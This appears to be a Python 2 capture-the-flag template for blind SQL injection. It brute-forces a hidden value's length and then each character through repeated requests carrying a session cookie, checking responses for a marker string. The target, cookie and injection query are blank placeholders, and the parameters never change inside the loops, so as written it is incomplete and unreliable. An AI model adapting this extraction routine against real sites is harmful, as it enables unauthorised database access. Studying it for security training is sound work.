import requests

url = '' #fix it!
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies={'PHPSESSID':''} #fix it!
length = 5
flag=""
text="" #fix it!

while 1:
    params = {'column_name': "query"} #fix it!
    response = requests.get(url, headers=headers, cookies=cookies, params=params)
    status_code = response.status_code
    html_data = response.text
    print(response.url)
    if(html_data.find(text) != -1): 
        print "Find length"
        print "length = "+str(length)
        break
    else:
        length+=1

for i in range(1,length+1):
    for j in range(48,123):
        params = {'column_name': "query"} #fix it!
        response = requests.get(url, headers=headers, cookies=cookies, params=params)
        status_code = response.status_code
        html_data = response.text
        print(response.url)
        if (html_data.find(text) != -1):
            print "Find Key[+]"
            flag+=chr(j)
            print flag
            break